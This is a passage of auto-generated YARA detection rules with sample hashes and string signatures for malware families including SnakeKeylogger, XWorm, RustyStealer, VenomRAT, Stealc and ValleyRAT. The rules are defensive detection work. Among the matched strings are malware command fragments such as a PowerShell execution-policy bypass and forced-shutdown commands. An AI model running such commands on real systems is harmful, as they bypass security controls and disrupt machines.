      $s7 = "Invalid parent process level: %d" fullword ascii /* score: '15.00'*/
      $s8 = "_PYI_PARENT_PROCESS_LEVEL" fullword ascii /* score: '15.00'*/
      $s9 = "Failed to import symbol %hs from Python DLL." fullword wide /* score: '15.00'*/
      $s10 = "Failed to import symbol %hs from Tcl DLL." fullword wide /* score: '15.00'*/
      $s11 = "Failed to remove temporary directory: %s" fullword ascii /* score: '14.00'*/
      $s12 = "[PYI-%d:ERROR] " fullword wide /* score: '12.50'*/
      $s13 = "Path of Python DLL (%ls) and its name (%hs) exceed buffer size (%d)." fullword wide /* score: '12.00'*/
      $s14 = "Failed to convert path to Tcl DLL to wide-char string." fullword wide /* score: '12.00'*/
      $s15 = "Failed to load Tcl DLL '%ls'." fullword wide /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__9154058d1dfc0a0203928a4ed25ab791_imphash__SnakeKeylogger_signature__b069d88b33e75313d6c2f825eb1f4_68 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_9154058d1dfc0a0203928a4ed25ab791(imphash).exe, SnakeKeylogger(signature)_b069d88b33e75313d6c2f825eb1f4188(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fc7b617c0317fa605e60e44a35bc6f6fb0e5d30b0cd5b0127034069bf5810317"
      hash2 = "26d35dab5514132671d904227e1b2306054138b3e84fe04bf6b7af1c0bfe0505"
   strings:
      $s1 = "!*ProcessorArchitecture&AssemblyContentType\"AssemblyNameFlags" fullword ascii /* score: '16.00'*/
      $s2 = "t NtProcessManager" fullword ascii /* score: '15.00'*/
      $s3 = "t TypeBuilderState*TypeLoaderEnvironment+" fullword ascii /* score: '13.00'*/
      $s4 = "t8IStateMachineBoxAwareAwaiter&DllImportSearchPath" fullword ascii /* score: '12.00'*/
      $s5 = "+<ComputeMethodSignatureHashCode" fullword ascii /* score: '10.00'*/
      $s6 = ",\"FINDEX_SEARCH_OPS,GET_FILEEX_INFO_LEVELS" fullword ascii /* score: '9.00'*/
      $s7 = "+ MemoryExtensions" fullword ascii /* score: '8.00'*/
      $s8 = "t$SendOrPostCallback8SynchronizationLockException(ThreadAbortException8ThreadInt64PersistentCounter" fullword ascii /* score: '8.00'*/
      $s9 = "+ ProbabilisticMap" fullword ascii /* score: '8.00'*/
      $s10 = "+ ParseQuoteString" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( all of them )
      ) or ( all of them )
}

rule _RustyStealer_signature__ebfcafca4943e1084db2c03154f3d02d_imphash__VenomRAT_signature__97c0c9d944f961cc568fd7bef1c71fdc_imph_69 {
   meta:
      description = "_subset_batch - from files RustyStealer(signature)_ebfcafca4943e1084db2c03154f3d02d(imphash).exe, VenomRAT(signature)_97c0c9d944f961cc568fd7bef1c71fdc(imphash).sys"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9fbae971ce5aae1971daaecdd459e7a49b8c5a2e54bf66ffbf8fed01126cd966"
      hash2 = "f3a30e693eb0a3ea54c91e6e7e7ba3082967083be9e9034da54c4dd967a01dc1"
   strings:
      $s1 = "entity not foundpermission deniedconnection refusedconnection resethost unreachablenetwork unreachableconnection abortednot conn" ascii /* score: '27.00'*/
      $s2 = "PATHlibrary\\std\\src\\sys\\process\\mod.rs" fullword ascii /* score: '15.00'*/
      $s3 = "goperation interruptedunsupportedunexpected end of fileout of memoryin progressother erroruncategorized errorOs" fullword ascii /* score: '14.00'*/
      $s4 = "fatal runtime error: thread result panicked on drop, aborting" fullword ascii /* score: '12.00'*/
      $s5 = "fatal runtime error: Rust panics must be rethrown, aborting" fullword ascii /* score: '10.00'*/
      $s6 = "fatal runtime error: failed to initiate panic, error , aborting" fullword ascii /* score: '10.00'*/
      $s7 = "a Display implementation returned an error unexpectedly/rustc/29483883eed69d5fb4db01964cdf2af4d86e9cb2\\library\\alloc\\src\\str" ascii /* score: '9.00'*/
      $s8 = "assertion failed: self.is_char_boundary(new_len)/rustc/29483883eed69d5fb4db01964cdf2af4d86e9cb2\\library\\alloc\\src\\raw_vec\\m" ascii /* score: '9.00'*/
      $s9 = "a Display implementation returned an error unexpectedly/rustc/29483883eed69d5fb4db01964cdf2af4d86e9cb2\\library\\alloc\\src\\str" ascii /* score: '9.00'*/
      $s10 = " bytes failed" fullword ascii /* score: '9.00'*/
      $s11 = "\" fn( ->  = falsetrue{ {  }: 0x" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__087fa31dc7d77feb208c5dda56c8c688_imphash__SnakeKeylogger_signature__1a41b236e54319b64f65b4f667766_70 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_087fa31dc7d77feb208c5dda56c8c688(imphash).exe, SnakeKeylogger(signature)_1a41b236e54319b64f65b4f667766e1e(imphash).exe, SnakeKeylogger(signature)_799e73863806df2964d80d12ce4e61ea(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a24110da2d42316258533bbff2c7c9852baa87bbb92be9f1bbc2858035d1cb76"
      hash2 = "37599b38dcbe50dd01c413d2c5aeccc6582d640cf81ad4eb1f5877ed25c40d5d"
      hash3 = "96cdecba4b523f512f7b3e2ad2d234f379fc2bdfd6d6b0b1499e7ee34f498341"
   strings:
      $s1 = "GetKeyHashCode@" fullword ascii /* score: '15.00'*/
      $s2 = " GetValueHashCode@" fullword ascii /* score: '12.00'*/
      $s3 = ">InitializeComForFinalizerThread@InitializeComForThreadPoolThread" fullword ascii /* score: '10.00'*/
      $s4 = "ComputeHash@" fullword ascii /* score: '10.00'*/
      $s5 = "RegistryKey.SetValue does not allow a String[] that contains a null String reference" fullword wide /* score: '10.00'*/
      $s6 = "RegistryKey.SetValue does not support arrays of type '{0}'. Only Byte[] and String[] are supported" fullword wide /* score: '10.00'*/
      $s7 = "$GetPerformanceData@" fullword ascii /* score: '9.00'*/
      $s8 = ",GetEnvironmentVariable4ExpandEnvironmentVariables" fullword ascii /* score: '9.00'*/
      $s9 = "GetFileLength@" fullword ascii /* score: '9.00'*/
      $s10 = "8GetOverlappedValueTaskSource@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and ( all of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__383df94d_WormLocker_signature__f34d5f2d4577ed6d9ceec516_71 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_383df94d.exe, WormLocker(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "383df94d827ca5b3e76452c9c7646dcdc84c1eee505c8ffd09a564eb00256117"
      hash2 = "cd9a1a722a0f2591bc76393f5b8f67523b7ffac26a1f17b7f5843fec0464850b"
   strings:
      $s1 = "  <!-- Enable themes for Windows common controls and dialogs (Windows XP and later) -->" fullword ascii /* score: '25.00'*/
      $s2 = "        <requestedExecutionLevel  level=\"asInvoker\" uiAccess=\"false\" />" fullword ascii /* score: '15.00'*/
      $s3 = "      <!-- Windows Vista -->" fullword ascii /* score: '12.00'*/
      $s4 = "            Specifying requestedExecutionLevel element will disable file and registry virtualization. " fullword ascii /* score: '11.00'*/
      $s5 = "       also set the 'EnableWindowsFormsHighDpiAutoResizing' setting to 'true' in their app.config. -->" fullword ascii /* score: '11.00'*/
      $s6 = "        <requestedExecutionLevel  level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s7 = "       to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should " fullword ascii /* score: '11.00'*/
      $s8 = "        <requestedExecutionLevel  level=\"highestAvailable\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s9 = "             requestedExecutionLevel node with one of the following." fullword ascii /* score: '11.00'*/
      $s10 = "          processorArchitecture=\"*\"" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( all of them )
      ) or ( all of them )
}

rule _XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__068782ee_XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_impha_72 {
   meta:
      description = "_subset_batch - from files XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_068782ee.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_11cbcbd4.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_21bb0341.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2240fbc2.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_35ec8915.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_38afc1d2.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_39c1fbf6.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_581c9667.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6c753d89.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6c841870.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6cc0f7d7.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7493625c.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7d01fd75.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7da61306.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9e867233.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a31547cc.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_af96d795.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b8d6be82.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b95360f0.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_bd0919ee.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c7f57465.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d0561c24.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d9022745.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e697c03e.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f297fae7.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f2b4ac2b.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fb448e89.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fbe2fa3c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "068782ee82a28c95bb740530b5be29bacba2f35d18f7d13dc62bca5efb640f37"
      hash2 = "11cbcbd4c5920334eced4fee9c929b35fbe276fc43a8716b5951e68f9c854d2a"
      hash3 = "21bb0341da3a8fcd8abe41537c7a5abebbef20234f5a3565cc46db7da184453b"
      hash4 = "2240fbc24d1f6ee89d2865adb3ccf3a65ef8fd387502be2f575eab3d34d18a2f"
      hash5 = "35ec891563481e0e104c5d96c7bbd8294691f931ef178ffc1693cac1151261ae"
      hash6 = "38afc1d23c69356d7bd6152d9b4a43d358556d0af15c3e4a45074206cec2d735"
      hash7 = "39c1fbf676469bf822ecbe228ef70ce8395f9d620f78dc88909b16eb4e37954c"
      hash8 = "581c9667bc3d30fe0181729e45119b18c9b371b0d425c5f27f9fd61f574c7caa"
      hash9 = "6c753d89a84cd6e4c1d7cf4bd81efff020b2ac0666cbe354d8981ea30ab3f641"
      hash10 = "6c841870635d44b697ca2408e2b897eb79a567806bbf451a3b52419bacde0b30"
      hash11 = "6cc0f7d70a31fb028d609c125a908cd780ca9f8ad6eeb8c8f64a6999c572badb"
      hash12 = "7493625ccbcd2c75a6d7fd602d16da2a77fb31bb721a5109580f06de540561c9"
      hash13 = "7d01fd758ae24ee508a8070092276348eac7d3d6142362746d3eb5cf7580cd4b"
      hash14 = "7da613062ee5e74cc0383cb2eba4307ddf80dcf7e639ed35656ff786c2272ba2"
      hash15 = "9e867233cfbab8f9657b83d39970cec5ec829fc955597cf899eddb1b7e90c3d8"
      hash16 = "a31547cc0400474bfd1bbc7b3ff59381fbbbe277e443d853c78f2bd3931f7bc8"
      hash17 = "af96d7958da84b57ec19105f8187e05a900bd46b300a79c60e5f2947b8f2bb7b"
      hash18 = "b8d6be820bde943df513eccc2587ab25635d813b51d5b827d06438dfea2cccc8"
      hash19 = "b95360f091412669760e7a6d01981eb192cc1582cf6fdfe51bc25a6bb8edbe29"
      hash20 = "bd0919ee3e36fc61894b7ce7aedfd47fe56fc18beaa03d9baedf22a40186d0c6"
      hash21 = "c7f57465b7bbe2f8a1c6faed5ac47c0e3a824e746f8fd5160c516531e373fc51"
      hash22 = "d0561c241f3c580eb8a6b0cb1896084ffcc38771610bf66557b37e5edc8ea7e6"
      hash23 = "d90227452ca4761204e86ced83268341fd436f1daa70cb0bd0f22df88e7a0236"
      hash24 = "e697c03ebf74e5412216c7b03ec17b38e2381fd4691811cdbfa798f287e66cf3"
      hash25 = "f297fae72c735e348c6027501abeb59ee7480c0304b3f5289ad7c6dff9a065e6"
      hash26 = "f2b4ac2b3250001cc08ef78727a2b2f519a1038d3c5dcd53b4de6a3d8d56a24e"
      hash27 = "fb448e89435b718aeba6ba3849202fb0d426faab559281ca721973391c9e46ec"
      hash28 = "fbe2fa3ccf0a5cd8e092cfa88f9e32b526322245877fa3448c8c7542990f22c0"
   strings:
      $x1 = "-ExecutionPolicy Bypass -File \"" fullword wide /* score: '31.00'*/
      $s2 = "shutdown.exe /f /s /t 0" fullword wide /* score: '22.00'*/
      $s3 = "shutdown.exe /f /r /t 0" fullword wide /* score: '22.00'*/
      $s4 = "shutdown.exe -L" fullword wide /* score: '18.00'*/
      $s5 = "EXECUTION_STATE" fullword ascii /* score: '12.00'*/
      $s6 = "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Saf" wide /* score: '12.00'*/
      $s7 = "PCLogoff" fullword wide /* score: '9.00'*/
      $s8 = "OfflineGet" fullword wide /* score: '9.00'*/
      $s9 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" fullword wide /* score: '9.00'*/
      $s10 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" fullword wide /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 700KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__54e8aab77a741ddbe4f0e1d5294d2ba8_imphash__SnakeKeylogger_signature__799e73863806df2964d80d12ce4e6_73 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_54e8aab77a741ddbe4f0e1d5294d2ba8(imphash).exe, SnakeKeylogger(signature)_799e73863806df2964d80d12ce4e61ea(imphash).exe, SnakeKeylogger(signature)_9154058d1dfc0a0203928a4ed25ab791(imphash).exe, SnakeKeylogger(signature)_9500a3099a7bd06339507f7c4c55ecd8(imphash).exe, SnakeKeylogger(signature)_b069d88b33e75313d6c2f825eb1f4188(imphash).exe, SnakeKeylogger(signature)_b069d88b33e75313d6c2f825eb1f4188(imphash)_8ac1fdc4.exe, SnakeKeylogger(signature)_b4d3f5d989eff50a07c3a8d85868cba4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f8343679b868073000380e233f32b10a04a9b4f3e28e7eb7bf58107566f9043c"
      hash2 = "96cdecba4b523f512f7b3e2ad2d234f379fc2bdfd6d6b0b1499e7ee34f498341"
      hash3 = "fc7b617c0317fa605e60e44a35bc6f6fb0e5d30b0cd5b0127034069bf5810317"
      hash4 = "74a40d2f809116abb9da9d754950e8ef484c6344087718d6f12ee36dff4db768"
      hash5 = "26d35dab5514132671d904227e1b2306054138b3e84fe04bf6b7af1c0bfe0505"
      hash6 = "8ac1fdc40a9f98635a344803303fbd13bea0ec3c04c7570764382c31c2eeb8b6"
      hash7 = "c24f664303cf46a812706b9e98d3f714c9fd2eac83a54ad2e53681f103438b2d"
   strings:
      $s1 = "*ComputePublicKeyToken" fullword ascii /* score: '16.00'*/
      $s2 = "\"ProcessFinalizers" fullword ascii /* score: '15.00'*/
      $s3 = "NFindInterfaceMethodImplementationTarget" fullword ascii /* score: '14.00'*/
      $s4 = " GetBooleanConfig" fullword ascii /* score: '12.00'*/
      $s5 = ":GetExceptionForLastWin32Error" fullword ascii /* score: '12.00'*/
      $s6 = ">GetThreadDeserializationTracker" fullword ascii /* score: '12.00'*/
      $s7 = "&GetRuntimeException" fullword ascii /* score: '12.00'*/
      $s8 = ".ComputeParametersString" fullword ascii /* score: '11.00'*/
      $s9 = "2RefreshCurrentProcessorId2ProcessorNumberSpeedCheck*UninlinedThreadStatic8CreateThreadLocalCountObject&AssignWorkItemQueue@" fullword ascii /* score: '11.00'*/
      $s10 = " GetDirectoryName,GetDirectoryNameOffset" fullword ascii /* score: '9.00'*/
      $s11 = "\"GetNewThunksBlock" fullword ascii /* score: '9.00'*/
      $s12 = "8GetPointerToFirstInvalidChar" fullword ascii /* score: '9.00'*/
      $s13 = "\"GetPartitionCount0GetMaxArraysPerPartition<TryGetInt32EnvironmentVariable" fullword ascii /* score: '9.00'*/
      $s14 = "8TryGetAppLocalIcuSwitchValue" fullword ascii /* score: '8.00'*/
      $s15 = "0GetLocaleDataNumericPart" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Stealc_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__ValleyRAT_signature__d42595b695fc008ef2c56aabd8efd68e_imphash___74 {
   meta:
      description = "_subset_batch - from files Stealc(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash)_018d7c99.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "091f171220ee279ad8a719373ad65527a88d5c8bf108d94976a03618e6d84c39"
      hash2 = "3e081805b7db9aa700d3e96fe2212493e1d4704a43ec7b57459f7dd0eb33bbd3"
      hash3 = "018d7c99435e7c6ad6fdb7e33e99005aa9a0b98d3571a361227240257ce72aca"
      hash4 = "23b2938d3c84a2157ba0a8347c1b62cf3f05dd5eaf53ddcea431efe6434c2074"
   strings:
      $s1 = "runtime.getproccount" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.(*gcWork).tryGetFast" fullword ascii /* score: '12.00'*/
      $s3 = "runtime.(*gcWork).tryGet" fullword ascii /* score: '12.00'*/
      $s4 = "runtime.rawbyteslice" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.gcMarkRootPrepare" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.atoi" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.gcMarkRootPrepare.func1" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.stringtoslicebyte" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.atoi32" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.(*gcWork).put" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.runfinq" fullword ascii /* score: '10.00'*/
      $s12 = "tryGetFast" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

